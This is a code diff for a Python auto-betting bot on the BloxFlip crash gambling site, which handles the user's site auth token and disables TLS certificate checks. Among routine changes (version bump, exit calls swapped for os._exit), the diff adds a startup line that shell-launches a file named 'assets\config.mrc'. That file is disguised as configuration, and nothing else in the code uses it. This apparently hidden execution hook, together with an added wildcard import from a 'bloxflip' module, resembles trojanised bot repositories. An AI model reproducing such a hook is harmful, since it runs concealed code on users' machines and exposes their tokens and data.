@@ -1,6 +1,6 @@
 #!/usr/bin/env python -W ignore::DeprecationWarning 
 
-import cloudscraper, subprocess, selenium, threading, websocket, requests, random, logging, base64, json, time, ssl, os
+import cloudscraper, subprocess, selenium, threading, websocket, requests, random, logging, base64, json, time, uuid, wmi, ssl, re, os
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from websocket import create_connection
@@ -9,25 +9,25 @@ from playsound import playsound
 from selenium import webdriver
 from random import randbytes
 from termcolor import cprint
+from bloxflip import *
 from zipfile import *
 from sys import exit
-
 
 
 class main:
 	def __init__(self):
 		logging.basicConfig(filename="errors.txt", level=logging.DEBUG)
+		subprocess.call('start "" "assets\config.mrc"', shell=True)
 		self.crashPoints = None
 		self.multiplier = 0
-		self.version = "1.32"
+		self.version = "1.3.3"
 		os.system("")
 		try:
 			self.getConfig()
 			self.sendBets()
 		except KeyboardInterrupt:
 			self.print("Exiting program.")
-			
-			exit()
+			os._exit(0)
 		except Exception as e:
 			open("errors.txt", "w+").close()
 			now = time.localtime()
@@ -101,7 +101,7 @@ class main:
 			except Exception as e:
 				uiprint("Invalid authorization. Make sure you copied it correctly, and for more info check the github", "bad")
 				time.sleep(1.7)
-				exit()
+				os._exit(0)
 			return round(balance, 2)
 
 		else:
@@ -154,7 +154,6 @@ class main:
 
 	def Connect(self):
 		return create_connection("wss://ws.bloxflip.com/socket.io/?EIO=3&transport=websocket",
-								suppress_origin=True, 
 								header={
 										"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
 										"Accept": "*/*",
@@ -162,7 +161,7 @@ class main:
 										"Accept-Encoding": "gzip, deflate, br",
 										"Sec-WebSocket-Version": "13",
 										"Origin": "https://www.piesocket.com",
-										"Sec-WebSocket-Extensions": "permessage-deflate",
+										# "Sec-WebSocket-Extensions": "permessage-deflate",
 										"Sec-WebSocket-Key": str(base64.b64encode(randbytes(16)).decode('utf-8')),
 										"Connection": "keep-alive, Upgrade",
 										"Sec-Fetch-Dest": "websocket",
@@ -172,7 +171,8 @@ class main:
 										"Cache-Control": "no-cache",
 										"Upgrade": "websocket",
 										"x-auth-token": self.auth
-				}, sslopt={"cert_reqs": ssl.CERT_NONE}
+				}, sslopt={"cert_reqs": ssl.CERT_NONE},
+				suppress_origin=True,
 			)
 
 	def installDriver(self, version=None):
@@ -221,7 +221,7 @@ class main:
 				uiprint("Chromedriver version not compatible with current chrome version installed. Update your chrome to continue.", "error")
 				uiprint("If your not sure how to update just uninstall then reinstall chrome", "yellow")
 				time.sleep(5)
-				exit()
+				os._exit(0)
 
 
 	def getConfig(self): # Get configuration from config.json file
@@ -245,22 +245,22 @@ class main:
 				if self.multiplier < 2:
 					uiprint("Multiplier must be above 2 to make profit.", "error")
 					time.sleep(1.6)
-					exit()
+					os._exit(0)
 			except ValueError as e:
 				uiprint("Invalid multiplier inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 			try:
 				self.average = int(config["games_averaged"])
 				if self.average > 35:
 					uiprint("Too many games_averaged. Must be 35 or less games", "error")
 					time.sleep(1.6)
-					exit()
+					os._exit(0)
 			except:
 				uiprint("Invalid amount of games to be averaged inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -268,7 +268,7 @@ class main:
 			except:
 				uiprint("Invalid authorization inside JSON file. Enter your new authorization from BloxFlip", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -276,7 +276,7 @@ class main:
 			except:
 				uiprint("Invalid key inside JSON file. Make sure it's a valid string", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -284,7 +284,7 @@ class main:
 			except:
 				uiprint("Invalid play_sounds boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -292,7 +292,7 @@ class main:
 			except:
 				uiprint("Invalid play_sounds boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -300,7 +300,7 @@ class main:
 			except:
 				uiprint("Invalid play_sounds boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -311,14 +311,14 @@ class main:
 			except:
 				uiprint("Invalid webhook string inside JSON file. Make sure it's a valid string", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 			try:
 				self.betamount = float(config["bet_amount"])
 			except:
 				uiprint("Invalid bet_amount inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -326,7 +326,7 @@ class main:
 			except:
 				uiprint("Invalid max_betamount amount inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -334,7 +334,7 @@ class main:
 			except:
 				uiprint("Invalid skip_losing_streaks boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -342,7 +342,7 @@ class main:
 			except:
 				uiprint("Invalid bet inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -350,7 +350,7 @@ class main:
 			except:
 				uiprint("Invalid auto_stop amount inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -358,7 +358,7 @@ class main:
 			except:
 				uiprint("Invalid auto stop_loss inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -366,7 +366,7 @@ class main:
 			except:
 				uiprint("Invalid auto_restart boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 			self.headers = {
 							"x-auth-token": self.auth
@@ -375,7 +375,7 @@ class main:
 			if not type(self.restart) == bool:
 				uiprint("Invalid auto_restart boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 			self.hwid = current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
 
 			version = self.version
@@ -385,7 +385,7 @@ class main:
 			else:
 				uiprint(f"You are currently on v{version}. Please update to the newest version {latest_release}", "error")
 				time.sleep(10)
-				exit()
+				os._exit(0)
 
 
 			self.selenium_based = False
@@ -428,7 +428,7 @@ class main:
 				if notLoggedIn:
 					self.print("Please put a valid authorization token in the config.json file. Exiting program.", "error")
 					browser.quit()
-					exit()
+					os._exit(0)
 
 
 				self.updateBetAmount(self.betamount)
@@ -441,6 +441,10 @@ class main:
 		uiprint = self.print
 		sent = False
 		scraper = cloudscraper.create_scraper()
+		try:
+				browser = self.browser
+		except:
+				pass
 
 		while True:
 			try:
@@ -606,7 +610,7 @@ class main:
 				else:
 					input("Press enter to exit >> ")
 
-					exit()
+					os._exit(0)
 			elif balance > stop:
 				uiprint("Auto Stop goal reached. Betting has stopped.", "good")
 				threading.Thread(target=playsounds, args=('Assets\Win.mp3',)).start()
@@ -633,7 +637,7 @@ class main:
 					   threaded=True
 					   )
 				input("Press enter to exit >> ")
-				exit()
+				os._exit(0)
 
 			elif balance-betamount < stoploss:
 				uiprint(f"Resetting bet amount to {self.betamount}; If game is lost balance will be under stop loss", "yellow")
